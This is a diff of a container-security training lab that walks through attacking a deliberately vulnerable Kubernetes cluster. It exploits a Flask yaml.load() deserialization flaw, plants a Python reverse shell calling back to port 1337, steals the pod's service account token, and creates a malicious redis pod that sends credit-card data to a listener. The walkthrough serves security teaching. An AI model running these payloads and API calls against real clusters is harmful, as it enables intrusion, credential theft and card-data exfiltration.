@@ -1,46 +1,56 @@
-# Attacking a Kubernetes Cluster
+# **Attacking a K8s Cluster**
 
+### * *
 
+-------
 
-### Start the Vulnerable K8s Cluster
+#### Step 1:
 
-##### Step 1:
+* Navigate to the `K8s-Cluster-Attack` directory on the provisioned server.
 
-* Navigate to `K8s-Cluster-Attack` directory
-
-```bash
+```
 cd /root/container_training/Kubernetes/K8s-Cluster-Attack
 ```
 
-* Multiplex terminal session with tmux, run: `tmux`
+* Multiplex terminal session with `tmux` and split panes horizontally.
 
+```
+tmux
 
-##### Step 2:
+tmux split-window -v
+```
 
+-------
+
+#### Step 2:
 
 * Setup the insecure cluster and start the flask stack to be run on the cluster. Wait for the command to complete.
 
-```bash
+```commandline
 ./setup_insecure_kube.sh
 
 ./setup_flask_stack.sh
 ```
 
-* Verify that the flask stack is `running` and make sure the `Status` is `Running`
+* Verify that the flask stack is running and make sure the `Status` is `Running`
 
-```bash
+```commandline
 kubectl get pods
 ```
 
 * Check for running services. You should see `ngflask-redis-service` and its `ClusterIP`. 
 
-```bash
+```commandline
 kubectl get svc
 ```
 
-* Set the URL of ngflask-redis as an Environment variable
+-------
 
-```bash
+#### Step 3:
+
+* Set the URL of `ngflask-redis` as an Environment variable
+
+```commandline
 NGFLASK=http://$(kubectl get svc ngflask-redis-service -o yaml | grep "clusterIP" |awk '{print $2}')
 
 echo $NGFLASK
@@ -48,36 +58,32 @@ echo $NGFLASK
 
 * Check if the service is running correctly. It should respond with `Please POST JSON requests to this URL`.
 
-```bash
+```commandline
 curl -XGET $NGFLASK
 ```
 
-### Generating Artifacts
+-------
 
+#### Step 4:
 
-##### Step 3:
+* Generate a few artifacts by creating transactions on the Application
 
-* Create a few transactions on the Application
-
-```bash
+```commandline
 curl -XGET $NGFLASK/generate
 ```
 
-It should come back with the following response
+### *It should return with the following response*
 
-```
-{
-"success": "10 transactions generated successfully"
-}
-```
+### *`{"success": "10 transactions generated successfully"}`*
+
 
 * Check the latest transaction that has been logged by our app
 
-```bash
+```commandline
 curl -XGET $NGFLASK/status
 ```
 
-It should come back with a response that looks similar to the one below
+### *It should come back with a response that looks similar to the one below*
 
 ```html
 <html>
@@ -100,31 +106,31 @@ It should come back with a response that looks similar to the one below
 </html>
 ```
 
+-------
 
-#### Our objective is to compromise this cluster. Run our cryptominer and steal card numbers 😉
+#### Step 5:
 
-### Exploiting a Deserialization Flaw
+### *Our objective is to compromise this cluster. Run our cryptominer and steal card numbers 😉*
 
-###### Our Flask app has a `yaml.load()` deserialization flaw. Using this flaw, one can potentially gain access to execute code on the backend-server. We will be using this vulnerability to exploit our app.
+### *Exploiting a Deserialization Flaw*
 
-###### Our app allows us to upload yaml files to capture expense information. We will load a malicious yaml file that should execute code for us.
+#### *Our Flask app has a `yaml.load()` deserialization flaw. Using this flaw, one can potentially gain access to execute code on the backend-server. We will be using this vulnerability to exploit our app.*
 
-
-##### Step 4:
+#### *Our app allows us to upload yaml files to capture expense information. We will load a malicious yaml file that should execute code for us.*
 
 * Navigate to `payloads` directory that has malicious yaml files
 
-```bash
+```commandline
 cd /root/container_training/Kubernetes/K8s-Cluster-Attack/payloads
 ```
 
 * Upload a malicious yaml file and identify the flaw
 
-```bash
+```commandline
 http --form POST $NGFLASK/upload file@test_payment.yml
 ```
 
-It should come back with a response similar to the one below
+### *It should come back with a response similar to the one below*
 
 ```
 HTTP/1.1 200 OK
@@ -141,53 +147,61 @@ Server: nginx/1.11.13
 
 * Verify if the malicious transaction that was generated.
 
-```bash
+```commandline
 curl -XGET $NGFLASK/status
 ```
 
-You should see a dump of all Environment variable on the container
+### *You should see a dump of all Environment variables on the container.*
 
-### Reverse TCP Shell on our K8s Cluster
+-------
 
-##### Step 5:
+#### Step 6:
 
-* Get the Server-IP and copy the value.
+* Fetch the IP of the provisioned server
 
-```bash
+```commandline
 serverip
 ```
 
 * In the `payloads` directory, edit `line 2` of `reverse_shell.yml` and replace `<serverip>` with value of `serverip` fetched in the previous step.
 
-```bash
+```commandline
 sed -i -e 's/Server_IP_Here/<serverip>/g' reverse_shell.yml
 ```
 
-EXAMPLE:
+**EXAMPLE**: `sed -i -e 's/Server_IP_Here/104.1.1.1/g' reverse_shell.yml`
 
+* Check the file to confirm the changes made
+
+```commandline
+cat reverse_shell.yml
 ```
-["echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.1.1\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' > shell.py && python shell.py &"]
-```
 
-* Create and split panes horizontally with `ctrl + b + Shift+"`
+**EXAMPLE**: `["echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"104.1.1.1\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' > shell.py && python shell.py &"]`
 
-* Ensure you're in low lower panel. If you are not, Run: `ctrl + b + (lower arrow key)`
+-------
 
-* Start netcat listener
+#### Step 7:
 
-```bash
+* Switch to the lowe panel and start the `netcat` listener on port `1337`
+
+```commandline
+# Switches to the lower panel
+ctrl + b + (lower arrow key)
+
 nc -l 1337
 ```
 
-* Go to the upper pane with `ctrl + b + (upper arrow key)`
+* Go to the upper pane and post the malicious `reverse_shell.yml` file
 
-* Post the malicious `reverse_shell.yml`.
+```commandline
+# Switches to the upper pane
+ctrl + b + (upper arrow key)
 
-```bash
 http --form POST $NGFLASK/upload file@reverse_shell.yml
 ```
 
-It should come back with a response similar to the one below
+### *It should come back with a response similar to the one below*
 
 ```
 HTTP/1.1 200 OK
@@ -202,7 +216,7 @@ Server: nginx/1.11.13
 }
 ```
 
-On the tab running netcat, you should have gotten a netcat reverse TCP shell! The output on the tab running netcat will be similar to the one below.
+### *On the tab running netcat, you should have gotten a netcat reverse TCP shell! The output on the tab running `netcat` will be similar to the one below.*
 
 ```
 nc -l 1337
@@ -210,40 +224,40 @@ nc -l 1337
 /app #
 ```
 
-Now you can interact with your target app and backend K8s cluster
+### *Now you can interact with your target app and backend K8s cluster*
 
-**NOTE: Do NOT use the `clear` or `Command/Ctrl+C` key. You will lose access to the shell and will have to re-do Step 5**
+### **NOTE: Do NOT use the `Command/Ctrl+C` key. You will lose access to the shell and will have to re-do `Step 6`**
 
-### Pivoting to K8s cluster
+-------
 
-##### Step 6:
+#### Step 8:
 
 * In the reverse shell, navigate within the pod to fetch `Service Account` token.
 
-* To go to the lower pane with netcat reverse TCP shell, run `ctrl + b + (lower arrow key)`
+```commandline
+# Switches to the lower panel
+ctrl + b + (lower arrow key)
 
-
-```bash
 cd /run/secrets/kubernetes.io/serviceaccount
 
 export TOKEN=$(cat token)
 ```
 
-###### We are now going to masquerade with the cluster-admin's token.
+### *We are now going to masquerade with the cluster-admin's token.*
 
 * Start interacting with K8s API. To get a JSON dump of all pods running, run
 
-```bash
+```commandline
 curl -s https://10.96.0.1/api/v1/namespaces/default/pods -XGET -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" --insecure
 ```
 
 * Fetch the `clusterIP` of `redis-service` and note the value. 
 
-```bash
+```commandline
 curl -s https://10.96.0.1/api/v1/namespaces/default/services -XGET -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" --insecure | grep -E '("redis-service"|clusterIP)'
 ```
 
-The response will be similar to the one below. Please note that the IP may differ
+### *The response will be similar to the one below. Please note that the IP may differ*
 
 ```
         "clusterIP": "10.96.0.1",
@@ -252,7 +266,11 @@ The response will be similar to the one below. Please note that the IP may diffe
         "clusterIP": "10.97.43.203", # This is the MASTERHOST IP of Redis
 ```
 
-* On your machine, copy the following JSON value and make the following changes
+* On your machine, copy the following JSON value and make the following changes:
+    
+    * Change `Redis-Service-ClusterIP-HERE` with the value of redis-service `clusterIP`.
+    
+    * Change `SERVERIP-HERE` with that of Server IP that can be fetched by running `serverip`
 
 ```
 cat > mal-redis.json <<EOF
@@ -290,19 +308,21 @@ cat > mal-redis.json <<EOF
 EOF
 ```
 
-Change the value of `MASTERHOST` with the value of redis-service `clusterIP`.
-
-Change the value of `LISTENER_IP` with that of Server IP that can be fetched by running `serverip`
-
 * In the reverse shell, if the `pwd` is `/run/secrets/kubernetes.io/serviceaccount` you will have to navigate to the `tmp` directory. 
 
-```bash
+```commandline
 cd /tmp
 ```
 
-###### root user of the pod will not have permission to create/edit files in `/run/secrets/kubernetes.io/serviceaccount`
+### *root user of the pod will not have permission to create/edit files in `/run/secrets/kubernetes.io/serviceaccount`*
+
+-------
+
+#### Step 9:
 
 * Copy the edited JSON from the previous step and paste it in `/tmp` directory.
+
+**EXAMPLE**:
 
 ```bash
 # Copy the JSON value you edited, please don't copy the one below
@@ -332,44 +352,57 @@ EOF
 
 * Check if `mal-redis.json` has been created in '/tmp/'
 
-```bash
+```commandline
 ls
 ```
 
 * Create the `malicious-redis` pod
 
-```bash
+```commandline
 curl -s https://10.96.0.1/api/v1/namespaces/default/pods -XPOST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d@mal-redis.json --insecure
 ```
 
-* In the other tab, navigate to `K8s-Cluster-Attack` directory and run the `tornado server`.
+-------
 
-* Go to the upper pane with `ctrl + b + (upper arrow key)`
+#### Step 10:
 
-```bash
+* Switch to the upper pane, navigate to the `K8s-Cluster-Attack` directory and setup the listener
+
+```commandline
+ctrl + b + (upper arrow key)
+
 cd /root/container_training/Kubernetes/K8s-Cluster-Attack
 
 ./tornado_server.py
 ```
 
-You should now see all the credit-card details being posted to the tornado lister from the malicious redis pod
+### *You should now see all the credit-card details being posted to the listener from the malicious redis pod*
 
-### Stop all the pods and services
+-------
 
-* Stop the tornado server with `ctrl + c`
+#### Step 11:
 
-* Stop the pods and services
+* Stop the listener, pods and services that were created
 
-```bash
+```commandline
+# Stop the listener
+crtl + c
+
 cd /root/container_training/Kubernetes/K8s-Cluster-Attack
 
 kubectl delete -f ngflask-redis-service.yml -f redis-service.yml -f ngflaskredis-deployment.yml
 ```
 
-* Check if any `pods` are running and delete them
+* Check if other `pods` or `configmaps` are on the cluster and delete them
 
-```bash
+```commandline
 kubectl get pods
 
 kubectl delete pod mal-redis
+
+kubectl delete configmap nginx-config
 ```
+
+---------
+
+### Reading Material/References:
